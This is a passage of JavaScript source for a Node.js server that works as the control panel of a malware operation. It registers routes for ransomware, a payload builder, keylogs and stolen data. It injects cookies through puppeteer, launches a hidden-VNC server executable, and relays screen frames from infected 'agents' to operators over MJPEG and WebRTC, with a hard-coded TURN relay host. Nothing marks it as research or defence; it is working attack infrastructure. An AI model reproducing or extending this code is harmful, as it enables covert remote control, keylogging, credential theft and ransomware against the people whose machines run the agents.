const express = require('express');
const socketIO = require('socket.io');
const http = require('http');
const cors = require('cors');
const fetch = require('node-fetch');
const helmet = require('helmet');
const morgan = require('morgan');
const path = require('path');
const axios = require('axios');
const fs = require('fs');
const { spawn, exec } = require('child_process');
const net = require('net');
const util = require('util');
const execPromise = util.promisify(exec);
require('dotenv').config();
const { startCleanupJob } = require('./utils/cleanup');
require('./database');

// ─── RATE LIMITING ──────────────────────────────────────────────
const rateLimit = require('express-rate-limit');
const compression = require('compression');

// WebSocket server for WebRTC signaling (frontend) - separate port
const WebSocket = require('ws');
const webRTCServer = http.createServer();
const wss = new WebSocket.Server({ server: webRTCServer });

// TCP signaling server (for HVNC client)
const { startTcpSignaling } = require('../tcp-signaling');
const { verifyToken, requireAdmin } = require('./routes/auth');
// Import routes
const authRoutes = require('./routes/auth');
const agentRoutes = require('./routes/agents');
const taskRoutes = require('./routes/tasks');
const moduleRoutes = require('./routes/modules');
const ransomwareRoutes = require('./routes/ransomware');
const builderRoutes = require('./routes/builder');
const keylogsRoutes = require('./routes/keylogs');
const stolenRoutes = require('./routes/stolen');


// ─── PUPPETEER-CORE FOR COOKIE INJECTION ──────────────────────
let puppeteer;
try {
    puppeteer = require('puppeteer-core');
} catch (err) {
    console.warn('[INJECT] puppeteer-core not installed. Run: npm install puppeteer-core');
}

// ─── HVNC STATE STORE ──────────────────────────────────────────
const hvncFrames = new Map();    // agentId -> { frame, width, height, timestamp, sessionId }
const hvncViewers = new Map();   // agentId -> Set of viewer sockets



// ─── WEBRTC STATE STORE ──────────────────────────────────────────
const webrtcSessions = new Map();  // sessionId -> { agentId, pc, track, viewers, offer, answer }
const webrtcViewers = new Map();   // sessionId -> Set of viewer sockets

const crypto = require('crypto');
const TURN_SECRET = process.env.TURN_SECRET;

function turnCredentials(ttlSeconds = 86400) {
    const username = Math.floor(Date.now() / 1000) + ttlSeconds;
    const credential = crypto
        .createHmac('sha1', TURN_SECRET)
        .update(String(username))
        .digest('base64');
    return { username: String(username), credential };
}



// ─── TURN ICE SERVERS (coturn @ driveone.online) ──────────────
function getIceServers() {
  if (!TURN_SECRET || TURN_SECRET === 'CHANGE_ME') {
    console.warn('[TURN] TURN_SECRET missing - serving STUN only');
    return [
      { urls: ['stun:stun.l.google.com:19302', 'stun:stun1.l.google.com:19302'] }
    ];
  }
  const { username, credential } = turnCredentials(3600);
  return [
    { urls: ['stun:63.250.44.173:3478', 'stun:stun.l.google.com:19302'] },
    {
      urls: [
        'turn:63.250.44.173:3478',
        'turn:63.250.44.173:3478?transport=tcp',
        'turns:63.250.44.173:5349'
      ],
      username,
      credential
    }
  ];
}

// ─── WEBRTC SESSION MANAGEMENT ─────────────────────────────────
function createWebRTCSession(sessionId, agentId) {
    if (!webrtcSessions.has(sessionId)) {
        webrtcSessions.set(sessionId, {
            agentId: agentId,
            created: Date.now(),
            viewers: new Set(),
            offer: null,
            answer: null,
            iceCandidates: [],
            viewerIceCandidates: [],  // Add this line
            connected: false,
            hvnc: false  // Will be set when HVNC creates session
        });
        console.log(`[WebRTC] 📱 Session created: ${sessionId} for agent ${agentId}`);
    }
    return webrtcSessions.get(sessionId);
}
function getWebRTCSession(sessionId) {
    return webrtcSessions.get(sessionId);
}

function deleteWebRTCSession(sessionId) {
    const session = webrtcSessions.get(sessionId);
    if (session) {
        // Clean up viewers
        for (const viewer of session.viewers) {
            try {
                if (viewer.readyState === WebSocket.OPEN) {
                    viewer.close();
                }
            } catch (e) {}
        }
        webrtcSessions.delete(sessionId);
        console.log(`[WebRTC] 🗑️ Session deleted: ${sessionId}`);
    }
}

function addViewerToSession(sessionId, ws) {
    const session = webrtcSessions.get(sessionId);
    if (session) {
        session.viewers.add(ws);
        console.log(`[WebRTC] 👁️ Viewer added to session ${sessionId} (${session.viewers.size} viewers)`);
        return true;
    }
    return false;
}

function removeViewerFromSession(sessionId, ws) {
    const session = webrtcSessions.get(sessionId);
    if (session) {
        session.viewers.delete(ws);
        console.log(`[WebRTC] 👁️ Viewer removed from session ${sessionId} (${session.viewers.size} viewers)`);
        if (session.viewers.size === 0) {
            // Optionally cleanup session after no viewers
            // deleteWebRTCSession(sessionId);
        }
        return true;
    }
    return false;
}




// ─── HELPER: Find Chrome with remote debugging ──────────────────
async function findChromeDebugPort() {
    try {
        const { execSync } = require('child_process');
        for (let port = 9222; port <= 9322; port++) {
            try {
                const result = execSync(`netstat -ano | findstr ":${port}.*LISTENING"`, {
                    stdio: ['pipe', 'pipe', 'ignore'],
                    timeout: 2000
                });
                if (result && result.toString().trim()) {
                    const lines = result.toString().split('\n');
                    for (const line of lines) {
                        const parts = line.trim().split(/\s+/);
                        if (parts.length >= 5) {
                            const pid = parts[4];
                            if (pid && !isNaN(pid)) {
                                try {
                                    const taskList = execSync(`tasklist /FI "PID eq ${pid}" /FO CSV`, {
                                        stdio: ['pipe', 'pipe', 'ignore'],
                                        timeout: 2000
                                    });
                                    if (taskList && taskList.toString().toLowerCase().includes('chrome.exe')) {
                                        return port;
                                    }
                                } catch {}
                            }
                        }
                    }
                }
            } catch {}
        }
        return null;
    } catch {
        return null;
    }
}

// ------------------------------------------------------------
// RDP-LOCAL SERVER INTEGRATION
// ------------------------------------------------------------
let rdpProcess = null;

function isPortInUse(port) {
    return new Promise((resolve) => {
        const tester = net.createServer()
            .once('error', (err) => {
                if (err.code === 'EADDRINUSE') {
                    resolve(true);
                } else {
                    resolve(false);
                }
            })
            .once('listening', () => {
                tester.close();
                resolve(false);
            })
            .listen(port, '127.0.0.1');
    });
}

function killProcessOnPort(port) {
    return new Promise((resolve) => {
        try {
            const { execSync } = require('child_process');
            try {
                const result = execSync(
                    process.platform === 'win32'
                        ? `for /f "tokens=5" %a in ('netstat -ano ^| findstr :${port}') do taskkill /PID %a /F`
                        : `lsof -ti:${port} | xargs kill -9`,
                    { stdio: 'pipe', windowsHide: true }
                );
                console.log(`[Cleanup] Killed process on port ${port}`);
                resolve(true);
            } catch (e) {
                resolve(false);
            }
        } catch (e) {
            resolve(false);
        }
    });
}

function startRdpLocalServer() {
    const rdpPath = path.join(__dirname, '..', '..', 'tools', 'rdp-local');
    const rdpServer = path.join(rdpPath, 'server.js');
    if (!fs.existsSync(rdpServer)) {
        console.log('[RDP] ⚠️ rdp-local server not found at:', rdpServer);
        return null;
    }

    isPortInUse(9000).then((inUse) => {
        if (inUse) {
            console.log('[RDP] ℹ️ Port 9000 in use, killing existing process...');
            killProcessOnPort(9000).then(() => {
                setTimeout(() => {
                    startRdpServerProcess(rdpPath, rdpServer);
                }, 1000);
            });
            return;
        }
        startRdpServerProcess(rdpPath, rdpServer);
    });
    return null;
}

function startRdpServerProcess(rdpPath, rdpServer) {
    console.log('[RDP] 🚀 Starting rdp-local server on port 9000...');
    try {
        rdpProcess = spawn('node', [rdpServer], {
            cwd: rdpPath,
            detached: true,
            stdio: 'pipe',
            windowsHide: false
        });

        rdpProcess.stdout.on('data', (data) => {
            console.log(`[RDP] ${data.toString().trim()}`);
        });
        rdpProcess.stderr.on('data', (data) => {
            console.error(`[RDP] ${data.toString().trim()}`);
        });
        rdpProcess.on('error', (err) => {
            console.error(`[RDP] ❌ rdp-local error: ${err.message}`);
        });
        rdpProcess.on('exit', (code) => {
            console.log(`[RDP] ⛔ rdp-local server exited with code: ${code}`);
            rdpProcess = null;
        });
        rdpProcess.unref();
        console.log('[RDP] ✅ rdp-local server started on port 9000');
    } catch (error) {
        console.error(`[RDP] ❌ Failed to start rdp-local server: ${error.message}`);
    }
}

function stopRdpServer() {
    if (rdpProcess) {
        console.log('[RDP] 🛑 Stopping rdp-local server...');
        try {
            rdpProcess.kill();
        } catch (e) {
            console.error('[RDP] Error killing process:', e.message);
        }
        rdpProcess = null;
        console.log('[RDP] ✅ rdp-local server stopped');
    }
}

// ------------------------------------------------------------
// HVNC SERVER INTEGRATION (existing hvnc_server.exe)
// ------------------------------------------------------------
let hvncProcess = null;

function startHVNCServer() {
    const serverExe = path.join(__dirname, '..', '..', 'tools', 'hnvc', 'Server', 'hvnc_server.exe');
    const serverDir = path.dirname(serverExe);
    if (!fs.existsSync(serverExe)) {
        console.log('[HVNC] ⚠️ HVNC server not found at:', serverExe);
        return null;
    }

    console.log('[HVNC] 🚀 Starting HVNC server on port 1080...');

    try {
        hvncProcess = spawn(serverExe, ['1080'], {
            cwd: serverDir,
            detached: false,
            stdio: 'inherit',
            windowsHide: false
        });

        if (!hvncProcess) {
            console.error('[HVNC] ❌ Failed to spawn HVNC server process');
            return null;
        }

        hvncProcess.on('error', (err) => {
            console.error(`[HVNC] ❌ Process error: ${err.message}`);
            hvncProcess = null;
        });

        hvncProcess.on('exit', (code) => {
            console.log(`[HVNC] ⛔ Server exited with code: ${code}`);
            hvncProcess = null;
        });

        hvncProcess.unref();
        console.log(`[HVNC] ✅ Server process created with PID: ${hvncProcess.pid}`);
        return hvncProcess;
    } catch (error) {
        console.error(`[HVNC] ❌ Failed to start HVNC server: ${error.message}`);
        hvncProcess = null;
        return null;
    }
}

function stopHVNCServer() {
    if (hvncProcess) {
        console.log('[HVNC] 🛑 Stopping HVNC server...');
        try {
            hvncProcess.kill();
        } catch (e) {
            console.error('[HVNC] Error killing process:', e.message);
        }
        hvncProcess = null;
        console.log('[HVNC] ✅ Server stopped');
        return true;
    }
    console.log('[HVNC] ℹ️ No HVNC server running');
    return false;
}

// ------------------------------------------------------------
// CREATE APP
// ------------------------------------------------------------
const app = express();
const server = http.createServer(app);
const io = socketIO(server, {
    cors: {
        origin: process.env.FRONTEND_URL || '*',
        methods: ['GET', 'POST']
    }
});

app.set('trust proxy', 1);

// ─── AUTO CLEANUP TASKS ──────────────────────────────────────
function cleanupTasks() {
    try {
        const db = require('./database');
        db.run(
            "DELETE FROM tasks WHERE status IN ('completed', 'failed', 'error') AND createdAt < datetime('now', '-1 hour')",
            function(err) {
                if (!err && this.changes > 0) {
                    console.log(`[CLEANUP] Deleted ${this.changes} old completed/failed tasks`);
                }
            }
        );
        db.run(
            "DELETE FROM tasks WHERE status = 'pending' AND createdAt < datetime('now', '-24 hours')",
            function(err) {
                if (!err && this.changes > 0) {
                    console.log(`[CLEANUP] Deleted ${this.changes} stuck pending tasks`);
                }
            }
        );
        db.run("VACUUM", function(err) {
            if (!err) {
                console.log(`[CLEANUP] Database vacuumed at ${new Date().toISOString()}`);
            }
        });
    } catch (err) {
        console.error(`[CLEANUP] Error: ${err.message}`);
    }
}

setInterval(cleanupTasks, 300000);
setTimeout(cleanupTasks, 5000);

// ─── RATE LIMITING ────────────────────────────────────────────
const agentLimiter = rateLimit({
    windowMs: 10000,
    max: 30,
    message: { error: 'Too many requests, please slow down' },
    skip: (req) => req.path === '/health'
});


// Uploads happen at FPS rate (10-30/sec = 100-300 per 10s).
// Do NOT reuse agentLimiter (max 30/10s) — it would 429 your own agent.
const agentUploadLimiter = rateLimit({
    windowMs: 10000,
    max: 600,            // ~60 FPS headroom
    message: { error: 'Upload rate exceeded' },
    standardHeaders: true,
    legacyHeaders: false
});




app.use(compression());



// ------------------------------------------------------------
// WebRTC WebSocket server (on separate port 8082)
// ------------------------------------------------------------
// ─── WEBRTC WEBSOCKET SERVER (Enhanced) ──────────────────────────
wss.on('connection', (ws) => {
    console.log('[WebRTC] 🟢 Client connected');
    ws.isAlive = true;
    ws.sessionId = null;
    ws.role = null;

    ws.on('pong', () => {
        ws.isAlive = true;
    });

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            console.log('[WebRTC] 📨 Received:', data.type, 'from', data.sessionId || 'unknown');

            switch (data.type) {
                case 'viewer_connect':
                    // Viewer wants to connect to a session
                    const viewerSessionId = data.sessionId;
                    if (!viewerSessionId) {
                        ws.send(JSON.stringify({
                            type: 'error',
                            message: 'Missing sessionId'
                        }));
                        return;
                    }
                    
                    const session = getWebRTCSession(viewerSessionId);
                    if (!session) {
                        ws.send(JSON.stringify({
                            type: 'error',
                            message: 'Session not found or expired'
                        }));
                        return;
                    }
                    
                    ws.sessionId = viewerSessionId;
                    ws.role = 'viewer';
                    ws.session = session;
                    
                    // Add viewer to session
                    addViewerToSession(viewerSessionId, ws);
                    
                    // Send connection confirmed
                    ws.send(JSON.stringify({
                        type: 'viewer_connected',
                        sessionId: viewerSessionId,
                        agentId: session.agentId
                    }));
                    
                    console.log(`[WebRTC] 👁️ Viewer connected to session ${viewerSessionId}`);
                    
                    // If there's an offer waiting, send it now
                    if (session.offer) {
                        console.log(`[WebRTC] 📤 Sending queued offer to viewer ${viewerSessionId}`);
                        ws.send(JSON.stringify({
                            type: 'offer',
                            sdp: session.offer,
                            sessionId: viewerSessionId
                        }));
                    }
                    break;

                case 'agent_offer':
                    // Agent is sending an SDP offer
                    const agentSessionId = data.sessionId;
                    if (!agentSessionId) {
                        ws.send(JSON.stringify({
                            type: 'error',
                            message: 'Missing sessionId'
                        }));
                        return;
                    }
                    
                    const agentSession = getWebRTCSession(agentSessionId);
                    if (!agentSession) {
                        ws.send(JSON.stringify({
                            type: 'error',
                            message: 'Session not found'
                        }));
                        return;
                    }
                    
                    // Store the offer
                    agentSession.offer = data.sdp;
                    agentSession.connected = true;
                    ws.sessionId = agentSessionId;
                    ws.role = 'agent';
                    ws.session = agentSession;
                    
                    console.log(`[WebRTC] 📤 Agent offer received for session ${agentSessionId}`);
                    
                    // Forward offer to all connected viewers
                    let forwardedCount = 0;
                    for (const viewer of agentSession.viewers) {
                        if (viewer.readyState === WebSocket.OPEN) {
                            viewer.send(JSON.stringify({
                                type: 'offer',
                                sdp: data.sdp,
                                sessionId: agentSessionId
                            }));
                            forwardedCount++;
                        }
                    }
                    console.log(`[WebRTC] 📤 Offer forwarded to ${forwardedCount} viewers`);
                    
                    // If no viewers yet, store for later
                    if (forwardedCount === 0) {
                        console.log(`[WebRTC] 📦 No viewers yet, offer stored for session ${agentSessionId}`);
                    }
                    break;

                case 'viewer_answer':
                    // Viewer is sending an SDP answer
                    const answerSessionId = data.sessionId;
                    if (!answerSessionId) {
                        ws.send(JSON.stringify({
                            type: 'error',
                            message: 'Missing sessionId'
                        }));
                        return;
                    }
                    
                    const answerSession = getWebRTCSession(answerSessionId);
                    if (!answerSession) {
                        ws.send(JSON.stringify({
                            type: 'error',
                            message: 'Session not found'
                        }));
                        return;
                    }
                    
                    // Store the answer
                    answerSession.answer = data.sdp;
                    
                    console.log(`[WebRTC] 📤 Viewer answer received for session ${answerSessionId}`);
                    
                    // Forward answer to agent (only if agent is connected)
                    // In this architecture, we need to find the agent's WebSocket
                    // Since we don't have direct agent WS in this scope, we'll use HTTP to notify
                    // Or we can store and let agent poll
                    // For simplicity, we'll use the signaling server approach
                    
                    // Find the agent socket via the agentSockets map
                    const agentId = answerSession.agentId;
                    const agentSocket = getAgentSocket(agentId);
                    if (agentSocket && agentSocket.connected) {
                        agentSocket.emit('webrtc_answer', {
                            sessionId: answerSessionId,
                            sdp: data.sdp
                        });
                        console.log(`[WebRTC] 📤 Answer forwarded to agent ${agentId} via Socket.IO`);
                    } else {
                        console.log(`[WebRTC] ⚠️ Agent ${agentId} not connected via Socket.IO, storing answer`);
                        answerSession.pendingAnswer = data.sdp;
                    }
                    break;

                case 'ice_candidate':
    const iceSessionId = data.sessionId;
    const candidate = data.candidate;
    // If target is not provided, detect based on session type
    const iceSession = getWebRTCSession(iceSessionId);
    if (!iceSession) {
        ws.send(JSON.stringify({
            type: 'error',
            message: 'Session not found'
        }));
        return;
    }
    
    // Determine default target: HVNC sessions use 'agent', others use 'viewer'
    const isHvnc = iceSession.hvnc ? true : false;
    const target = data.target || (isHvnc ? 'agent' : 'viewer');
    
    if (!iceSessionId || !candidate) {
        ws.send(JSON.stringify({
            type: 'error',
            message: 'Missing sessionId or candidate'
        }));
        return;
    }
    
    console.log(`[WebRTC] 🧊 ICE candidate for session ${iceSessionId} -> ${target}`);
    
    if (target === 'viewer') {
        // Agent -> Viewer: forward to all viewers
        let viewerCount = 0;
        for (const viewer of iceSession.viewers) {
            if (viewer.readyState === WebSocket.OPEN) {
                viewer.send(JSON.stringify({
                    type: 'ice_candidate',
                    candidate: candidate,
                    sessionId: iceSessionId
                }));
                viewerCount++;
            }
        }
        console.log(`[WebRTC] 🧊 ICE candidate forwarded to ${viewerCount} viewers`);
    } else {
        // Viewer -> Agent: store in BOTH arrays so regular WebRTC and HVNC pollers get them
        if (!iceSession.viewerIceCandidates) iceSession.viewerIceCandidates = [];
        if (!iceSession.iceCandidates) iceSession.iceCandidates = [];
        iceSession.viewerIceCandidates.push(candidate);
        iceSession.iceCandidates.push({ candidate, timestamp: Date.now() });
        console.log(`[WebRTC] 📦 ICE candidate stored for agent (${iceSession.iceCandidates.length} total)`);
    }
    break;

                case 'disconnect':
                    // Client disconnecting
                    if (ws.sessionId) {
                        const session = getWebRTCSession(ws.sessionId);
                        if (session) {
                            if (ws.role === 'viewer') {
                                removeViewerFromSession(ws.sessionId, ws);
                            }
                        }
                    }
                    ws.send(JSON.stringify({
                        type: 'disconnected',
                        message: 'Disconnected from WebRTC signaling'
                    }));
                    ws.close();
                    break;

                default:
                    console.log('[WebRTC] ⚠️ Unknown message type:', data.type);
                    ws.send(JSON.stringify({
                        type: 'error',
                        message: `Unknown message type: ${data.type}`
                    }));
            }
        } catch (e) {
            console.error('[WebRTC] ❌ Error processing message:', e);
            ws.send(JSON.stringify({
                type: 'error',
                message: e.message
            }));
        }
    });

    ws.on('close', () => {
        console.log('[WebRTC] 🔴 Client disconnected', ws.sessionId || 'unknown');
        
        // Clean up session
        if (ws.sessionId) {
            if (ws.role === 'viewer') {
                removeViewerFromSession(ws.sessionId, ws);
            } else if (ws.role === 'agent') {
                // Agent disconnected, but keep session for reconnection
                const session = getWebRTCSession(ws.sessionId);
                if (session) {
                    session.connected = false;
                }
            }
        }
    });

    // Heartbeat
    const heartbeatInterval = setInterval(() => {
        if (ws.isAlive === false) {
            return ws.terminate();
        }
        ws.isAlive = false;
        ws.ping();
    }, 30000);

    ws.on('close', () => {
        clearInterval(heartbeatInterval);
    });
});

// ------------------------------------------------------------
// MIDDLEWARE
// ------------------------------------------------------------
app.use(helmet());
app.use(cors());
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true, limit: '100mb' }));
app.use(morgan('combined', {
    skip: (req) => req.path.startsWith('/api/mjpeg/')
}));
app.use(morgan('dev', { skip: (req) => req.path.includes('/api/mjpeg/latest') || req.path.includes('/api/mjpeg/stream') }));
// Apply rate limiting to agent endpoints
app.use('/api/agents/heartbeat', agentLimiter);
app.use('/api/tasks/pending/*', agentLimiter);
// app.use('/api/modules/result', agentLimiter);


app.use((req, res, next) => {
  res.setHeader(
  'Content-Security-Policy',
  "default-src 'self'; " +
  "script-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://cdnjs.cloudflare.com; " +
  "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdnjs.cloudflare.com; " +
  "font-src 'self' https://fonts.gstatic.com https://cdnjs.cloudflare.com; " +
  "img-src 'self' data: https:; " +
  "connect-src 'self' ws://driveone.online wss://driveone.online; " +
  "frame-src 'none'; " +
  "object-src 'none';"
);
  next();
});





// ════════════════════════════════════════════════════════════════
// MJPEG RELAY — SECURE (token-gated uploads + viewer auth)
// ════════════════════════════════════════════════════════════════
const multer = require('multer');
const upload = multer({
    storage: multer.memoryStorage(),
    limits: { fileSize: 3 * 1024 * 1024, files: 1 }
});

// --- Upload capability tokens: agentId -> { token, expiresAt } ---
const uploadTokens = new Map();
const UPLOAD_TOKEN_TTL_MS = 30 * 1000;        // 30 s, refreshed on every valid upload

function createUploadToken(agentId) {
    const token = crypto.randomBytes(32).toString('hex');
    uploadTokens.set(String(agentId), { token, expiresAt: Date.now() + UPLOAD_TOKEN_TTL_MS });
    return token;
}
function revokeUploadToken(agentId) { uploadTokens.delete(String(agentId)); }

function isValidUploadToken(agentId, token) {
    const entry = uploadTokens.get(String(agentId));
    if (!entry || typeof token !== 'string') return false;
    if (Date.now() > entry.expiresAt) { uploadTokens.delete(String(agentId)); return false; }
    const a = Buffer.from(entry.token);
    const b = Buffer.from(token);
    return a.length === b.length && crypto.timingSafeEqual(a, b);
}

// --- Global frame slot (single active stream) ---
const mjpegState = {
    frame: null, timestamp: 0, fps: 0, quality: 40,
    width: 0, height: 0, agentId: null, frameCount: 0, clients: 0
};

// Dedicated upload limiter: 30 FPS x 10 s = 300 frames, headroom at 600.
// NEVER reuse agentLimiter (30/10s) here — it would 429 a live stream.
const uploadLimiter = rateLimit({
    windowMs: 10 * 1000, max: 600,
    standardHeaders: true, legacyHeaders: false,
    message: { error: 'Too many uploads' }
});

// <img> can't send headers, so the viewer token rides as ?token=.
// Reuses the existing verifyToken logic by injecting it as Bearer.
const mjpegViewerAuth = (req, res, next) => {
    if (req.query.token) req.headers.authorization = `Bearer ${req.query.token}`;
    try {
        const p = verifyToken(req, res, next);
        if (p && typeof p.catch === 'function') p.catch(next);
    } catch (err) { next(err); }
};

// Parse JPEG dimensions from SOF markers so /status reports the real size.
function parseJpegSize(buf) {
    let i = 2;
    while (i + 9 < buf.length) {
        if (buf[i] !== 0xFF) { i++; continue; }
        const marker = buf[i + 1];
        if (marker === 0xD8 || (marker >= 0xD0 && marker <= 0xD7) || marker === 0x01) { i += 2; continue; }
        if (marker === 0xD9 || marker === 0xDA) break;
        const segLen = (buf[i + 2] << 8) | buf[i + 3];
        if (segLen < 2) break;
        if (marker >= 0xC0 && marker <= 0xCF && ![0xC4, 0xC8, 0xCC].includes(marker)) {
            return { height: (buf[i + 5] << 8) | buf[i + 6], width: (buf[i + 7] << 8) | buf[i + 8] };
        }
        i += 2 + segLen;
    }
    return null;
}

// ─── Routes ──────────────────────────────────────────────────────

// Issue (or refresh) an upload capability token for one agent.
app.post('/api/mjpeg/session', verifyToken, (req, res) => {
    const agentId = req.body && req.body.agentId;
    if (!agentId) return res.status(400).json({ error: 'agentId required' });
    const uploadToken = createUploadToken(agentId);
    console.log(`[MJPEG] Upload token issued for agent ${agentId}`);
    res.json({ uploadToken, ttlMs: UPLOAD_TOKEN_TTL_MS });
});

// Revoke the token for one agent (fire-and-forget from the frontend).
app.post('/api/mjpeg/revoke', verifyToken, (req, res) => {
    const agentId = req.body && req.body.agentId;
    if (agentId) revokeUploadToken(agentId);
    res.json({ ok: true });
});

// Consecutive-failure cooldown: agentId -> { count, until }
const uploadFailures = new Map();

function uploadHardBlocked(agentId) {
    const f = uploadFailures.get(agentId);
    if (!f) return false;
    if (Date.now() > f.until) { uploadFailures.delete(agentId); return false; }
    return f.count >= 5;
}

app.post('/api/mjpeg/upload', uploadLimiter, (req, res, next) => {
    const agentId = req.query && req.query.agentId;
    const token   = req.query && req.query.token;

    if (uploadHardBlocked(agentId)) {
        return res.status(429).json({ error: 'Uploads paused' });
    }

    // Token validated BEFORE multer — rejected bodies are never parsed.
    if (!agentId || !isValidUploadToken(agentId, token)) {
        const f = uploadFailures.get(agentId) || { count: 0, until: 0 };
        f.count++;
        f.until = Date.now() + 60 * 1000;          // extends while spam continues
        uploadFailures.set(agentId, f);
        if (f.count === 1) {
            console.log(`[MJPEG] 🔒 Rejecting uploads from ${agentId} (token invalid/expired)`);
        }
        return res.status(401).json({ error: 'Unauthorized' });
    }

    uploadFailures.delete(agentId);                // a valid upload clears the cooldown
    next();
}, upload.single('frame'), (req, res) => {
    if (!req.file || !req.file.buffer || req.file.buffer.length === 0) {
        return res.status(400).json({ error: 'No frame received' });
    }

    // Token already validated — refresh the sliding TTL.
    const agentId = req.query.agentId;
    const entry = uploadTokens.get(String(agentId));
    if (entry) entry.expiresAt = Date.now() + UPLOAD_TOKEN_TTL_MS;

    const now = Date.now();
    if (mjpegState.lastFrameTs) {
        const inst = 1000 / Math.max(1, now - mjpegState.lastFrameTs);
        mjpegState.fps = mjpegState.fps
            ? Math.round(mjpegState.fps * 0.8 + inst * 0.2)
            : Math.round(inst);
    }
    mjpegState.lastFrameTs = now;

    const dims = parseJpegSize(req.file.buffer);
    if (dims) { mjpegState.width = dims.width; mjpegState.height = dims.height; }

    mjpegState.frame = req.file.buffer;
    mjpegState.timestamp = now;
    mjpegState.agentId = String(agentId);
    mjpegState.frameCount++;

    if (mjpegState.frameCount % 300 === 1) {
        console.log(`[MJPEG] Frame ${mjpegState.frameCount} from ${agentId} (${mjpegState.width}x${mjpegState.height}, ${mjpegState.fps} fps)`);
    }
    res.json({ ok: true, frames: mjpegState.frameCount });
});

// Latest frame — used by the self-clocking <img> poller.
app.get('/api/mjpeg/latest', mjpegViewerAuth, (req, res) => {
    if (!mjpegState.frame) return res.status(404).json({ error: 'No frame available yet' });
    res.set({
        'Content-Type': 'image/jpeg',
        'Cache-Control': 'no-store, no-cache, must-revalidate',
        'Pragma': 'no-cache',
        'Content-Length': mjpegState.frame.length
    });
    res.send(mjpegState.frame);
});

// Multipart keep-alive stream (backward compatible).
const MJPEG_BOUNDARY = 'driveone-frame';
app.get('/api/mjpeg/stream', mjpegViewerAuth, (req, res) => {
    if (!mjpegState.frame) return res.status(404).json({ error: 'No frame available yet' });
    mjpegState.clients++;
    res.writeHead(200, {
        'Content-Type': `multipart/x-mixed-replace; boundary=${MJPEG_BOUNDARY}`,
        'Cache-Control': 'no-store, no-cache, must-revalidate',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'X-Accel-Buffering': 'no'
    });
    let lastSent = 0;
    const push = () => {
        if (res.writableEnded || !mjpegState.frame || mjpegState.timestamp === lastSent) return;
        lastSent = mjpegState.timestamp;
        res.write(`--${MJPEG_BOUNDARY}\r\nContent-Type: image/jpeg\r\nContent-Length: ${mjpegState.frame.length}\r\n\r\n`);
        res.write(mjpegState.frame);
        res.write('\r\n');
    };
    push();
    const iv = setInterval(push, 100);   // push only when a NEW frame arrived
    req.on('close', () => {
        clearInterval(iv);
        mjpegState.clients = Math.max(0, mjpegState.clients - 1);
    });
});

// Status for the viewer HUD.
app.get('/api/mjpeg/status', verifyToken, (req, res) => {
    res.json({
        agentId: mjpegState.agentId,
        fps: mjpegState.fps,
        quality: mjpegState.quality,
        width: mjpegState.width,
        height: mjpegState.height,
        frameCount: mjpegState.frameCount,
        clients: mjpegState.clients,
        timestamp: mjpegState.timestamp
    });
});


app.post('/api/mjpeg/killall', verifyToken, (req, res) => {
    console.log('[MJPEG] 💀 KILLALL called - stopping all streams');

    // 1) Nuke capability tokens → any in-flight upload now 401s (cheaply)
    uploadTokens.clear();
    uploadFailures.clear();

    // 2) Wipe the frame slot → viewers get nothing more
    mjpegState.frame = null;
    mjpegState.agentId = null;
    mjpegState.frameCount = 0;
    mjpegState.fps = 0;
    mjpegState.lastFrameTs = 0;

  
    if (mjpegState.clients !== undefined) mjpegState.clients = 0;

    // 4) THE PART THAT STOPS THE AGENT: queue stop_host for every active agent.
    //    The agent polls /api/tasks/pending/<id> every ~10s and honors this —
    //    it's what makes the capture loop exit and the uploads end.
    const db = require('./database');
    db.all("SELECT agentId FROM agents WHERE status = 'active'", (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        let tasksCreated = 0;
        const taskId = Date.now() + '_kill';
        rows.forEach(row => {
            db.run(
                "INSERT INTO tasks (taskId, agentId, type, moduleName, moduleAction, status) VALUES (?, ?, ?, ?, ?, ?)",
                [taskId + '_' + row.agentId, row.agentId, 'module_action', 'mjpeg', 'stop_host', 'pending'],
                (err) => { if (!err) tasksCreated++; }
            );
        });
        console.log(`[MJPEG] ✅ Streams killed, stop_host queued for ${rows.length} agent(s)`);
        res.json({ message: 'All streams killed', agents: rows.length, tasksCreated });
    });
});




// ─── WEBRTC HTTP ENDPOINTS FOR AGENT COMMUNICATION ──────────────

// Agent registers its WebRTC session (via HTTP)
app.post('/api/webrtc/agent/register', verifyToken, (req, res) => {
    const { agentId, sessionId } = req.body;
    
    if (!agentId || !sessionId) {
        return res.status(400).json({
            success: false,
            message: 'Missing agentId or sessionId'
        });
    }
    
    const session = getWebRTCSession(sessionId);
    if (!session) {
        return res.status(404).json({
            success: false,
            message: 'Session not found'
        });
    }
    
    if (session.agentId !== agentId) {
        return res.status(403).json({
            success: false,
            message: 'Agent ID mismatch'
        });
    }
    
    // Update session with agent info
    session.agentRegistered = true;
    session.lastAgentPing = Date.now();
    
    res.json({
        success: true,
        message: 'Agent registered for WebRTC session',
        sessionId: sessionId,
        viewers: session.viewers.size
    });
});




// Agent sends ICE candidate (WebRTC)
app.post('/api/webrtc/agent/ice', verifyToken, (req, res) => {
    const { sessionId, candidate } = req.body;
    if (!sessionId || !candidate) {
        return res.status(400).json({ success: false, message: 'Missing sessionId or candidate' });
    }
    const session = getWebRTCSession(sessionId);
    if (!session) {
        return res.status(404).json({ success: false, message: 'Session not found' });
    }
    // Forward candidate to all connected viewers (WebSocket)
    let forwarded = 0;
    for (const viewer of session.viewers) {
        if (viewer.readyState === WebSocket.OPEN) {
            viewer.send(JSON.stringify({
                type: 'ice_candidate',
                candidate: candidate,
                sessionId: sessionId
            }));
            forwarded++;
        }
    }
    console.log(`[WebRTC] ICE candidate from agent forwarded to ${forwarded} viewers`);
    res.json({ success: true, forwarded });
});







// Agent sends SDP offer via HTTP (alternative to WebSocket)
app.post('/api/webrtc/agent/offer', verifyToken, (req, res) => {
    const { sessionId, sdp } = req.body;
    
    if (!sessionId || !sdp) {
        return res.status(400).json({
            success: false,
            message: 'Missing sessionId or sdp'
        });
    }
    
    const session = getWebRTCSession(sessionId);
    if (!session) {
        return res.status(404).json({
            success: false,
            message: 'Session not found'
        });
    }
    
    // Store the offer
    session.offer = sdp;
    session.connected = true;
    
    // Forward to all connected viewers via WebSocket
    let forwardedCount = 0;
    for (const viewer of session.viewers) {
        if (viewer.readyState === WebSocket.OPEN) {
